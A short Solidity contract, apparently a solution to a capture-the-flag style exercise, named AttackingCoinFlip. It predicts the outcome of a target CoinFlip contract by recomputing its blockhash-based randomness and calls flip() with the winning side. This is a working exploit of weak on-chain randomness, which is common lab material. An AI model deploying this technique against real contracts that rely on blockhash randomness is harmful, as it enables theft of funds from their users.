// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        CoinFlip hook; 
        hook = CoinFlip(contractAddress);
        
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        hook.flip(side);
    }
}